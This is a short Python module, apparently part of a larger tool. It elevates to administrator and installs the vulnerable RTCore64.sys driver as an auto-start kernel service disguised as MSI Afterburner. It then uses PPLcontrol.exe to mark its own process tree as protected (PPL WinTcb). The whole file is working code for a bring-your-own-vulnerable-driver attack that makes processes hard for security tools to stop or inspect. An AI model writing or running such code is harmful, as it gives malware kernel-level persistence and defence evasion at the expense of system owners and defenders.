import platform
import os
import zipfile
import subprocess
import psutil
import lwjgl
import is_admin


def Setppl():
    if platform.system() == 'Windows':
                if not is_admin.is_admin():
                    from Mod.GetAdmin.GetAdmin import Universal as GetAdmin
                    GetAdmin(args="-command use Setppl")

                else:
                    lwjgl.info("Unzip the sys file")
                    try:
                        with zipfile.ZipFile('Assets/Sys/RTCore64.zip', 'r') as zip_ref:
                            zip_ref.extractall('./Temp')
                    except Exception as e:
                        lwjgl.warning(e)
                    parent = psutil.Process(os.getpid())
                    pids = [parent.pid]
                    for child in parent.children(recursive=True):
                        pids.append(child.pid)
                    lwjgl.info("Delete old service if exists")
                    subprocess.run("sc.exe delete RTCore64")
                    lwjgl.info("Create an SC service")
                    subprocess.run(f'sc.exe create RTCore64 type= kernel start= auto binPath= "./Temp/RTCore64.sys" DisplayName= "Micro - Star MSI Afterburner"')
                    lwjgl.info("Start the service")
                    subprocess.run("net start RTCore64")
                    for pid in pids:
                        lwjgl.info(f"Set the PPL level -> ({pid})")
                        subprocess.run(f"./PPLcontrol.exe set {pid} PPL WinTcb")